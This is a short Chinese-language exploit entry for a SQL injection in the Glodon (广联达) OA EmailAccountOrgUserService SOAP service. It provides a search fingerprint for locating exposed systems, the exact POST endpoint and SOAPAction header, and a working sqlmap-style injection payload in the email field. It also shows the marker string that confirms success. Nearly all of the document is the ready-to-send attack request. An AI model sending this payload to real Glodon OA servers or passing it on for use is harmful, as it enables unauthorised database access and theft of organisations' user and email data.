# 广联达OAEmailAccountOrgUserServiceSQL注入漏洞

- **系统**：广联达OAEmailAccountOrgUserService　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="广联达 OA"`
- **请求**：`POST /Mail/Services/EmailAccountOrgUserService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetUserInfosByEmail"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetUserInfosByEmail xmlns="http://tempuri.org/">
<email>') AND 3515 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (3515=3515) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(122)+CHAR(113))) AND ('ShLa'='ShLa</email>
</GetUserInfosByEmail>
</soap:Body>
</soap:Envelope>
qkkkq1qjpzq
sqlmap
POST /Mail/Services/EmailAccountO…（脚本共 1090 字，完整版见原文）
```

**其他**
- 广联达OA EmailAccountOrgUserService SQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 广联达办公OA